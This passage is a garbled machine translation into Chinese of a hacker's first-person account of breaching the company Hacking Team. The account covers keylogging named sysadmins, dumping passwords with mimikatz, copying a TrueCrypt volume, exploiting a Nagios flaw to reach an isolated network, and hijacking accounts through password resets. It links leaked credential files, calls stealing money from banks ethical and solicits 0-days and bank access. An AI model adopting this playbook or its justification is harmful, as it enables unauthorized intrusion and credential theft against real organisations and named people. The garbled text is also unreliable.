+[1] https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
+[2] http://www.harmj0y.net/blog/tag/powerview/
+[3] http://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/
+[4] http://www.harmj0y.net/blog/redteaming/powerview-2-0/
+[5] http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/
+[6] http://www.slideshare.net/harmj0y/i-have-the-powerview
+[7] https://adsecurity.org/?p=2535
+[8] https://www.youtube.com/watch?v=rpwrKhgMd7E
+[9] https://github.com/mubix/netview
+[10] https://blogs.msdn.microsoft.com/rcormier/2013/03/30/how-to-perform-b​​ulk-downloads-of-files-in-sharepoint/
+[11] https://adsecurity.org/?page_id=41
+[12] http://www.darkoperator.com/?tag=Active+Directory
+[13] https://github.com/PowerShellMafia/PowerSploit
+[14] https://github.com/samratashok/nishang
+
+
+- [14 - 狩猎系列] ------------------------------------------ ----------
+
+阅读他们关于他们的基础设施的文档[1]，我看到了我
+仍然失去获取重要的东西 - “Rete Sviluppo”，一个孤立
+网络与RCS的源代码。一个公司的系统管理员总是有
+访问一切，所以我在计算机上搜索Mauro Romeo和Christian
+Pozzi看看他们如何管理Sviluppo网络，并看看是否有
+是任何其他有趣的系统，我应该调查。很简单
+访问他们的电脑，因为他们是Windows域的一部分，我会
+已获得管理员访问权限。 Mauro Romeo的电脑没有任何端口
+打开，所以我打开WMI [2]的端口并执行meterpreter [3]
+除了键盘记录和屏幕抓取与Get-Keystrokes和
+Get-TimeScreenshot，我使用了来自metasploit，CredMan.ps1的many / gather / modules
+[4]，搜索有趣的文件[5]。看到Pozzi有一个
+Truecrypt卷，我等到他装上它，然后复制掉
+文件。许多人对Christian Pozzi的弱密码（和
+Christian Pozzi一般来说，他提供了大量的材料[6] [7] [8] [9]）
+把它们作为一个假的线索包括在泄漏中，并且笑他。现实是
+mimikatz和键盘记录器平等地查看所有密码。
+
+[1] http://hacking.technology/Hacked%20Team/FileServer/FileServer/Hackingteam/InfrastrutturaIT/
+[2] http://www.hammer-software.com/wmigphowto.shtml
+[3] https://www.trustedsec.com/june-2015/no_psexec_needed/
+[4] https://gallery.technet.microsoft.com/scriptcenter/PowerShell-Credentials-d44c3cde
+[5] http://pwnwiki.io/#!presence/windows/find_files.md
+[6] http://archive.is/TbaPy
+[7] http://hacking.technology/Hacked%20Team/c.pozzi/screenshots/
+[8] http://hacking.technology/Hacked%20Team/c.pozzi/Desktop/you.txt
+[9] http://hacking.technology/Hacked%20Team/c.pozzi/credentials/
+
+
+- [15 - 桥] ------------------------------------------ -----------------
+
+在Christian Pozzi的Truecrypt卷中，有一个包含许多文本文件
+密码[1]。其中一个是一个全自动Nagios服务器，有
+访问Sviluppo网络以便监控它。我找到了桥梁
+需要。文本文件只有web界面的密码，但有
+一个公共代码执行漏洞[2]（这是一个未经验证的漏洞，但它
+要求至少有一个用户启动了一个会话，对此我使用了
+密码从文本文件）。
+
+[1] http://hacking.technology/Hacked%20Team/c.pozzi/Truecrypt%20Volume/Login%20HT.txt
+[2] http://seclists.org/fulldisclosure/2014/Oct/78
+
+
+- [16 - 重用和重置密码] --------------------------------------
+
+阅读电子邮件，我会看到丹尼尔米兰准许访问git repos。一世已经有他的Windows密码感谢mimikatz。我试过它的gitserver和它的工作。然后我试过sudo，它的工作。对于gitlab服务器和他们的twitter帐户，我使用“忘记我的密码”功能以及我访问他们的邮件服务器以重置密码。 - 
+[17 - 总结] ---------------------------------------------
+这就是所需要的取缔一家公司，制止他们的侵犯人权行为。黑客的美丽和不对称：100个小时的工作，一个人可以通过一个数百万美元的公司解雇多年的工作。黑客给了一个机会战斗和胜利。黑客指南通常以免责声明结束：这些信息仅仅是前瞻性目的，是一个道德黑客，没有攻击系统，你没有权限等等。我会说同样，但对“道德”黑客的反叛概念。泄露文件，从银行盗取资金，并努力保护普通人的电脑是伦理黑客。然而，大多数自称为“道德黑客”的人只是为那些支付高额咨询费的人提供安全保障，他们通常是那些最受骇客攻击的人。黑客团队认为自己是意大利灵感设计的一部分[1]。我看到Vincenzetti，他的公司，他的警察在警察，Carabinieri和政府，作为意大利法西斯主义的长期传统的一部分。我想把这本指南写给阿曼多·迪亚斯学校袭击的受害者，以及所有那些曾被意大利法西斯人泄漏血液的人。
+[1] https://twitter.com/coracurrier/status/618104723263090688
+
+-- [18 - 联系] ------------------------------ --------------------------------
+给我发送矛的网络钓鱼尝试，死亡威胁在意大利语[1] [2]并给我0天或进入银行，公司，政府等。
+[1] http://andres.delgado.ec/2016/01/15/el-miedo-de-vigilar-a-los-vigilantes/ 
+[2] https://twitter.com/CthulhuSec/status/619459002854977537
+完全加密的电子邮件请： https://securityinabox.org/es/thunderbird_usarenigmail-BEGIN 
+
+PGP公共密钥块-----
+
+mQENBFVp37MBCACu0rMiDtOtn98NurHUPYyI3Fua+bmF2E7OUihTodv4F/N04KKx
+vDZlhKfgeLVSns5oSimBKhv4Z2bzvvc1w/00JH7UTLcZNbt9WGxtLEs+C+jF9j2g
+27QIfOJGLFhzYm2GYWIiKr88y95YLJxvrMNmJEDwonTECY68RNaoohjy/TcdWA8x
++fCM4OHxM4AwkqqbaAtqUwAJ3Wxr+Hr/3KV+UNV1lBPlGGVSnV+OA4m8XWaPE73h
+VYMVbIkJzOXK9enaXyiGKL8LdOHonz5LaGraRousmiu8JCc6HwLHWJLrkcTI9lP8
+Ms3gckaJ30JnPc/qGSaFqvl4pJbx/CK6CwqrABEBAAG0IEhhY2sgQmFjayEgPGhh
+Y2tiYWNrQHJpc2V1cC5uZXQ+iQE3BBMBCgAhBQJXAvPFAhsDBQsJCAcDBRUKCQgL
+BRYCAwEAAh4BAheAAAoJEDScPRHoqSXQoTwIAI8YFRdTptbyEl6Khk2h8+cr3tac
+QdqVNDdp6nbP2rVPW+o3DeTNg0R+87NAlGWPg17VWxsYoa4ZwKHdD/tTNPk0Sldf
+cQE+IBfSaO0084d6nvSYTpd6iWBvCgJ1iQQwCq0oTgROzDURvWZ6lwyTZ8XK1KF0
+JCloCSnbXB8cCemXnQLZwjGvBVgQyaF49rHYn9+edsudn341oPB+7LK7l8vj5Pys
+4eauRd/XzYqxqNzlQ5ea6MZuZZL9PX8eN2obJzGaK4qvxQ31uDh/YiP3MeBzFJX8
+X2NYUOYWm3oxiGQohoAn//BVHtk2Xf7hxAY4bbDEQEoDLSPybZEXugzM6gC5AQ0E
+VWnfswEIANaqa8fFyiiXYWJVizUsVGbjTTO7WfuNflg4F/q/HQBYfl4ne3edL2Ai
+oHOGg0OMNuhNrs56eLRyB/6IjM3TCcfn074HL37eDT0Z9p+rbxPDPFOJAMFYyyjm
+n5a6HfmctRzjEXccKFaqlwalhnRP6MRFZGKU6+x1nXbiW8sqGEH0a/VdCR3/CY5F
+Pbvmhh894wOzivUlP86TwjWGxLu1kHFo7JDgp8YkRGsXv0mvFav70QXtHllxOAy9
+WlBP72gPyiWQ/fSUuoM+WDrMZZ9ETt0j3Uwx0Wo42ZoOXmbAd2jgJXSI9+9e4YUo
+jYYjoU4ZuX77iM3+VWW1J1xJujOXJ/sAEQEAAYkBHwQYAQIACQUCVWnfswIbDAAK
+CRA0nD0R6Kkl0ArYB/47LnABkz/t6M1PwOFvDN3e2JNgS1QV2YpBdog1hQj6RiEA
+OoeQKXTEYaymUwYXadSj7oCFRSyhYRvSMb4GZBa1bo8RxrrTVa0vZk8uA0DB1ZZR
+LWvSR7nwcUkZglZCq3Jpmsy1VLjCrMC4hXnFeGi9AX1fh28RYHudh8pecnGKh+Gi
+JKp0XtOqGF5NH/Zdgz6t+Z8U++vuwWQaubMJTRdMTGhaRv+jIzKOiO9YtPNamHRq
+Mf2vA3oqf22vgWQbK1MOK/4Tp6MGg/VR2SaKAsqyAZC7l5TeoSPN5HdEgA7u5GpB
+D0lLGUSkx24yD1sIAGEZ4B57VZNBS0az8HoQeF0k
+=E5+y
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+
+                      If not you, who? If not now, when?
+                _   _            _      ____             _    _ 
+               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
+               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
+               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
+               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)
